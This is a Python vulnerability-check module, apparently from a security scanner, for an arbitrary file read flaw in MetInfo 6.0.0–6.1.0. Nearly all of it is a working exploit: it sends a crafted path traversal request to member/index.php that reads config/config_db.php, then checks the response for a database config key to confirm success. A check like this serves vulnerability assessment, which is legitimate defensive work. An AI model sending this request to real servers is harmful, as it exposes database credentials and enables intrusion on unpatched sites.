#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class Metinfo_Anyfile_Read_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Metinfo任意文件读取漏洞',
            'description': 'Metinfo任意文件读取漏洞,影响范围为: MetInfo 6.0.0~6.1.0',
            'date': '2018-08-27',
            'exptype': 'check',
            'type': 'File Read'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            "User-Agent": get_useragent()
        }

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_url = self.url + '/member/index.php?a=doshow&m=include&c=old_thumb&dir=http/./.../..././/./.../..././/config/config_db.php'
            req = await request.get(check_url, headers = self.headers)
            if "con_db_id" in await req.text()  and req.status==200:
                return True
        except Exception as e:
            # print(e)
            pass

if __name__ == '__main__':
    Metinfo_Anyfile_Read = Metinfo_Anyfile_Read_BaseVerify('http://127.0.0.1:8080')
    Metinfo_Anyfile_Read.check()